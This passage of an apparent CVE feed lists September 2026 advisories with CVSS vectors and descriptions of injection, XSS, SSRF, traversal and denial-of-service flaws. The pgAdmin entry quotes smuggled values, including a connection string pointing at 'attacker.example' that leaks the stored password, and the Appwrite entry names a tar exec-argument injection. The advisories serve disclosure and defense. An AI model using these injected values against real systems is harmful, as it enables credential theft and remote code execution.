| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-306` |
| Published | 2026-09-18T01:16:56.120 |

NASA CryptoLib 1.5.0 contains an authentication downgrade vulnerability in the Telecommand (TC) receive path. The receiver selects the Security Association used for SDLS processing solely from the SPI field inside the incoming frame, but it does not verify that the selected SA is authorized for the frame's GVCID.

### CVE-2026-93453

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-640` |
| Published | 2026-09-18T00:17:49.693 |

SOGo before 5.12.11 constructs password-reset links using the client-supplied Origin header as the authority, allowing unauthenticated attackers to redirect recovery tokens to attacker-controlled domains. Attackers can submit password recovery requests with a malicious Origin header to have valid password-reset tokens mailed to victim recovery addresses within links pointing to attacker infrastructure, enabling account takeover.

### CVE-2026-93452

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-787` |
| Published | 2026-09-18T00:17:49.540 |

snappy-java through 1.1.10.8 contains a buffer overflow vulnerability in Snappy.compress(ByteBuffer, ByteBuffer) that writes past the end of the destination buffer. Attackers can supply incompressible data that exceeds the destination buffer's remaining capacity, corrupting off-heap memory and causing JVM termination.

### CVE-2026-93450

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-674` |
| Published | 2026-09-18T00:17:49.230 |

go-openapi/swag jsonutils before 0.27.1 contains a stack overflow vulnerability in ordered JSON parsing and serialization due to unbounded recursion with no depth limit. Remote unauthenticated attackers can submit deeply nested JSON documents to services accepting OpenAPI specifications, causing fatal stack overflow that terminates the process and all in-flight requests.

### CVE-2026-93436

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-401` |
| Published | 2026-09-17T23:18:54.710 |

vLLM through 0.29.0 fails to properly clean up decode-side metadata for rejected inference requests in prefill/decode disaggregated deployments. Remote attackers can submit requests with max_tokens=0 to exhaust decode-worker memory without bound until the worker restarts.

### CVE-2026-93435

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-674` |
| Published | 2026-09-17T23:18:54.553 |

redis-parser through 3.0.0 contains a denial of service vulnerability in the RESP protocol parser that allows malicious Redis endpoints to crash the client process through unbounded recursion on nested arrays. Attackers can send crafted RESP byte streams with repeated array headers that exhaust the V8 call stack, causing an uncaught RangeError that terminates the Node.js process without triggering error handling callbacks.

### CVE-2026-54343

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-17T22:17:00.390 |

Frappe Learning Management System (LMS) is a learning system that helps users structure their content. Prior to version 2.52.1, a remote attacker can request a traversal path handled by SCORMRenderer.render in lms/page_renderers.py. The renderer constructs and opens a server-side path without first confirming that its real path remains within public/scorm, allowing files outside the SCORM directory to be read when they are accessible to the server process. This issue is fixed in version 2.52.1.

### CVE-2026-77615

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-17T21:17:38.557 |

Paella Player is a set of libraries to create a multi stream video player. Prior to Paella Player 2.12.11 (as used in Opencast prior to 19.7 and 20.2), there is a potential XSS attack though closed captions cue text. This vulnerability is fixed in 2.12.11.

### CVE-2026-54571

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-190` |
| Published | 2026-09-17T19:16:50.843 |

ESPAsyncWebServer is an asynchronous HTTP and WebSocket server library for ESP32, ESP8266, RP2040 and RP2350. Prior to 3.11.1, the multipart/form-data parser in src/WebRequest.cpp stores _boundaryPosition as an 8-bit value while _parseMultipartPostByte processes the boundary. A remote request containing an exactly 256-byte multipart boundary wraps _boundaryPosition from 255 to zero, prevents the boundary parsing loop from terminating, consumes excessive CPU, and triggers a FreeRTOS watchdog reset on affected ESP32 or ESP8266 devices. This issue is fixed in version 3.11.1.

### CVE-2026-52836

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-125` |
| Published | 2026-09-17T18:16:44.697 |

OpenDDS is an open source C++ implementation of the Object Management Group (OMG) Data Distribution Service (DDS). Prior to 3.34.0, a network attacker can crash a reachable OpenDDS participant by sending a malformed RTPS UDP submessage whose crafted length or sequence-number state causes dds/DCPS/transport/rtps_udp/RtpsUdpReceiveStrategy.cpp in RtpsUdpReceiveStrategy::handle_input() to advance ACE_Message_Block::rd_ptr() beyond valid data. The parser can then call dds/DCPS/transport/rtps_udp/RtpsSampleHeader.cpp in RtpsSampleHeader::init(), which dereferences the invalid read pointer without first validating it against wr_ptr() or ensuring that a complete submessage header remains. The resulting SIGSEGV occurs in the receive thread, terminates the DDS process, and destroys the DDS entities hosted by that participant. No authentication, prior protocol state, or victim interaction is required. This issue is fixed in version 3.34.0.

### CVE-2026-89036

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-88` |
| Published | 2026-09-17T16:18:28.540 |

Appwrite before 2.0.0 contains an argument injection vulnerability that allows authenticated users with functions.write or sites.write permissions to execute arbitrary commands by injecting TAB characters into the providerRootDirectory parameter used to construct GNU tar commands. The application uses escapeshellcmd instead of escapeshellarg and fails to quote the parameter, allowing TAB characters to survive sanitization and be interpreted as argument separators, enabling injection of arbitrary GNU tar arguments such as --checkpoint-action=exec to achieve remote code execution as the builds worker process user.

### CVE-2026-86864

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-88` |
| Published | 2026-09-17T16:18:18.010 |

pgAdmin 4's Backup tool appended the client-supplied 'database' field from the /backup/job/<sid>/object request to the pg_dump argument vector as a bare trailing positional argument, without validation. Because pg_dump parses its options with getopt_long, which permutes arguments, a value beginning with a dash was interpreted as an option rather than as a database name. A value such as --file=/absolute/path therefore overrode the storage-confined --file that pgAdmin had constructed earlier, causing pg_dump to write its output anywhere the pgAdmin process could write, outside the user's File Manager storage directory. This yields arbitrary file creation and overwrite as the operating-system account running pgAdmin, which can destroy pgAdmin's own configuration database and, depending on the target chosen, be escalated further.

The same field additionally permitted connection-string injection. libpq expands a database name containing an equals sign into a full connection string, and keywords embedded there override the --host and --port that pgAdmin passes, so a value such as 'host=attacker.example port=5432 dbname=x' redirected pg_dump to a server of the attacker's choosing. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection carries that credential to the attacker-nominated endpoint. Both behaviours are reachable by any authenticated user holding the tools_backup permission, which is granted to the default User role.

The fix stops passing the database name through the argument vector altogether and supplies it in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. This matches the approach already used by the Import/Export tool. Regression tests assert that the database name is absent from the constructed argument vector and that PGDATABASE carries the exact requested value.

This issue affects pgAdmin 4: from the introduction of the trailing positional database argument in the Backup tool before 9.18.

### CVE-2026-69197

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-200;CWE-862` |
| Published | 2026-09-17T16:17:41.010 |

Umbraco is an ASP.NET CMS. Prior to 13.15.1, 17.5.3, and 18.0.2, the Content Delivery API applies member and Public Access checks to the directly requested node but not to referenced nodes serialized through Content Picker or Multi-Node Tree Picker properties, including pickers nested in Block List, Block Grid, or Rich Text Editor blocks. When DeliveryApi:PublicAccess is enabled, an anonymous caller can retrieve a protected node's name, route, and id through an unprotected referencing node and use ?expand to retrieve full property values. When the Delivery API is instead gated by the organization-wide API key, a key holder can still bypass per-node Public Access through the same expansion path. The same RequestContextOutputExpansionStrategyV2 and ElementOnlyOutputExpansionStrategy path also bypasses allowed or disallowed content-type alias restrictions for referenced content. Direct requests for the protected node still return 401, and no integrity or availability impact is established. This issue is fixed in versions 13.15.1, 17.5.3, and 18.0.2.

### CVE-2026-92987

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-407` |
| Published | 2026-09-17T15:17:02.203 |

roxmltree through 0.21.1 performs quadratic-time attribute and namespace validation during XML parsing without limits on attribute count. Attackers can craft XML documents with tens of thousands of attributes on a single element to consume excessive CPU time and cause denial of service.

### CVE-2026-92983

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-772` |
| Published | 2026-09-17T15:17:01.540 |

InternLM LMDeploy through 0.17.0 in DistServe prefill/decode disaggregation mode fails to release scheduler sessions because the proxy uses user-facing session IDs instead of internal scheduler keys. Unauthenticated attackers can send completion requests to the proxy endpoint that accumulate unreleased scheduler metadata and memory until the prefill worker is out-of-memory killed.

### CVE-2026-63459

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-17T15:16:49.290 |

Vendure is an open-source headless commerce platform. Prior to 3.6.5, RichTextDescriptionCell in packages/dashboard/src/lib/components/shared/table-cell/order-table-cell-components.tsx attempts to strip markup by assigning an administrator-controlled description to a live element's innerHTML and then reading textContent. Active resource markup can execute an event handler during the innerHTML assignment before textContent is read. A lower-privilege administrator can store such markup in descriptions rendered by the Products list, Collections list, Promotions list, Payment Methods list, or Shipping Methods list, and script executes when another administrator views the affected row. This stored cross-site scripting can compromise the viewing administrator's session and enable cross-privilege or cross-channel administrative actions. This issue is fixed in version 3.6.5.

### CVE-2026-93593

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-09-18T14:19:10.413 |

ArcadeDB before 26.9.1 fails to enforce security-group types ACL entries for TimeSeries types because the ACL resolver builds permissions from bucket IDs, but TimeSeries types do not own normal record buckets. An authenticated low-privilege user can read or insert TimeSeries samples despite explicit deny rules by exploiting the missing type-name-based access check that causes permission lookups to fail open.

### CVE-2026-87775

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T06:16:40.743 |

The Tz Weekly Radio Schedule WordPress plugin through 1.8.1 does not sanitize and escape a parameter before using it to build a SQL query on an AJAX action available to unauthenticated users, allowing unauthenticated attackers to perform SQL injection attacks and extract sensitive data from the database.

### CVE-2026-87774

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T06:16:40.637 |

The Tz Weekly Radio Schedule WordPress plugin through 1.8.1 does not sanitize and escape a parameter before using it to build a SQL query on an AJAX action available to unauthenticated users, allowing unauthenticated attackers to perform SQL injection attacks and extract sensitive data from the database.

### CVE-2026-87771

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T06:16:40.523 |

The Product Question and Answer WordPress plugin through 1.1.0 does not sanitize and escape parameters before using them in SQL queries on AJAX actions available to unauthenticated users, allowing unauthenticated attackers to perform SQL injection attacks and extract sensitive data from the database.

### CVE-2026-87770

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T06:16:40.410 |

The Price Drop Alert for Woo Commerce WordPress plugin through 1.1 does not sanitize and escape parameters before using them in a SQL query on an AJAX action available to unauthenticated users, allowing unauthenticated attackers to perform SQL injection attacks and extract sensitive data from the database.

### CVE-2026-87767

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T06:16:40.307 |

The wp shortcut link and advertisement baner WordPress plugin through 1.2.0 does not sanitize and escape a parameter before using it in a SQL query on an AJAX action available to unauthenticated users, allowing unauthenticated attackers to perform SQL injection attacks and extract sensitive data from the database.

### CVE-2026-68791

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-863` |
| Published | 2026-09-17T23:18:08.290 |

Incorrect authorization in Azure Machine Learning allows an unauthorized attacker to disclose information over a network.

### CVE-2026-19477

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-121` |
| Published | 2026-09-17T19:16:41.430 |

There
is stack-based buffer overflow vulnerability recently discovered in MCC Universal Library for Linux (uldaq).  This may result in information disclosure or arbitrary code
execution. This vulnerability affects MCC Universal Library for Linux (uldaq) v1.2.1
and prior versions.

### CVE-2026-92980

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-434` |
| Published | 2026-09-17T17:17:56.600 |

HortusFox-Web prior to version 6.1 contains a remote code execution vulnerability that allows authenticated administrators to execute arbitrary OS commands as the web server user by abusing the Import/Export functionality. Attackers can leverage the Import/Export feature, which is intended solely for data portability, to deploy and execute malicious code on the underlying application server host.

### CVE-2026-92986

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-17T15:17:02.033 |

SiYuan before 3.8.4 renders document titles as HTML in the backlink dock tree without escaping markup characters. Attackers can set malicious titles through the rename API or crafted notebooks to execute scripts in the Electron renderer with access to child_process for command execution.

### CVE-2026-92985

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-17T15:17:01.840 |

SiYuan versions before 3.8.4 fail to escape bookmark labels imported from notebook files when rendering them in the dock tree. Attackers can craft malicious .sy notebook files with unescaped HTML in bookmark attributes that execute scripts in the Electron renderer with access to child_process for command execution.

### CVE-2026-93337

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-88` |
| Published | 2026-09-17T20:19:00.527 |

NetworkManager-l2tp contains an improper input validation vulnerability that allows local users with VPN connection creation permissions to inject arbitrary pppd directives by supplying mru or mtu property values containing trailing non-numeric content after a valid integer. Attackers can exploit the verbatim write of unvalidated strings into the pppd options file via write_config_option() to inject the plugin directive, causing the privileged pppd process to load an attacker-controlled shared object and achieve arbitrary code execution as root.

### CVE-2026-92984

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-384` |
| Published | 2026-09-17T15:17:01.690 |

HUBzero CMS through 2.2.32 accepts session identifiers from query strings and request variables instead of cookies alone, allowing unauthenticated attackers to fixate victim sessions. Attackers can obtain a valid session identifier, send victims a crafted link containing it, and replay the identifier after the victim authenticates to hijack their account and access.

### CVE-2026-71538

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-17T15:16:51.100 |

@cyclonedx/cyclonedx-npm creates CycloneDX Software Bill of Materials from npm projects. Prior to version 6.0.0, the Windows fallback path in src/npmRunner.ts, used when npm_execpath does not provide the npm CLI path, can construct a shell command containing an untrusted value from the --workspace option. When an attacker can influence that option and the fallback npm execution path is reached, shell metacharacters in the workspace value can execute arbitrary operating-system commands with the privileges of the user running the CLI, allowing data access, file modification, or service disruption. This issue is fixed in version 6.0.0.

### CVE-2026-93456

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-352` |
| Published | 2026-09-18T02:17:09.113 |

django-page-cms through 2.0.13 exempts five admin mutation views from CSRF protection in pages/admin/views.py, allowing attackers to forge requests that modify page content. Signed-in editors visiting a malicious page can be tricked into storing unescaped content that renders to all visitors, enabling stored cross-site scripting attacks.

### CVE-2026-93426

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T22:17:04.597 |

SigNoz versions 0.87.0 before 0.142.0 fail to escape user-supplied telemetry field-key names in the v5 query_range API, allowing authenticated users to inject SQL. Attackers with Viewer role or higher can embed backticks and quotes in field names to break out of identifiers and string literals, executing arbitrary ClickHouse SQL to read system tables and exfiltrate data.

### CVE-2026-54507

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-17T22:17:00.750 |

Vvveb is a powerful and easy to use CMS with page builder to build websites, blogs or ecommerce stores. Prior to 1.0.8.5, the oEmbedProxy() handler in admin/controller/editor/editor.php accepts an attacker-controlled url parameter and passes it to getUrl(), while validateUrl() in system/functions.php checks only the hostname string and does not validate its resolved addresses. An authenticated admin-panel user with editor/* permission can invoke GET /admin/index.php?module=editor/editor&action=oEmbedProxy with a dotted hostname or normalized loopback form that resolves to a private, loopback, link-local, or reserved address, causing the server to issue an HTTP or HTTPS request and return the response body. Storefront users and anonymous visitors cannot invoke the endpoint, but no CSRF token is required because the action uses GET. This can disclose internal service responses or cloud instance metadata and associated credentials. This issue is fixed in version 1.0.8.5.

### CVE-2026-55062

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-23;CWE-36;CWE-73` |
| Published | 2026-09-17T19:16:51.510 |

uniget is a universal installer and updater for (container) tools. Prior to 0.27.6, the hooks edit command in cmd/uniget/hooks.go concatenates an unvalidated hook filename with the selected hooks directory, allowing parent-directory components to escape that directory. The resulting path is passed to the configured editor, which can access or modify files outside the hooks directory with the privileges of the uniget process account. This issue is fixed in version 0.27.6.

### CVE-2026-93292

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T17:18:16.903 |

SigNoz versions from 0.88.0 before 0.142.1 contain a SQL injection vulnerability in trace-funnel analytics endpoints that interpolate service_name and span_name fields into ClickHouse string literals without escaping. Authenticated attackers can inject SQL through funnel step definitions to execute arbitrary queries and read results in HTTP responses.

### CVE-2026-54597

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T21:17:16.830 |

ITFlow provides an IT documentation, ticketing and accounting system for small managed service providers. Prior to version 26.07, an authenticated user with module_support write permission and access to a credential record can perform time-based blind SQL injection through the expires parameter of the share_generate_link handler in agent/ajax.php. sanitizeInput applies string-context escaping, but expires is inserted unquoted into the item_expire_at MySQL INTERVAL expression, allowing a crafted expression and interval unit to execute conditional database queries whose results are inferred from response delays. This can expose password hashes, SMTP credentials, API keys, encrypted vault data, and database metadata and support administrative takeover after credential cracking. This issue is fixed in version 26.07.

### CVE-2026-54583

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-73` |
| Published | 2026-09-17T17:16:43.593 |

mport is the MidnightBSD Package Manager. Prior to 2.7.8, libmport/fetch.c did not consistently reject empty, dot, dot-dot, or slash-containing bundle filenames before composing package download and write paths. Malicious package index data could place an unsafe value in indexEntry->bundlefile, and the missing is_valid_bundle_filename() checks allowed downloaded package data to be written outside the intended cache location or to an unsafe destination name. This issue is fixed in version 2.7.8.

### CVE-2026-54581

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
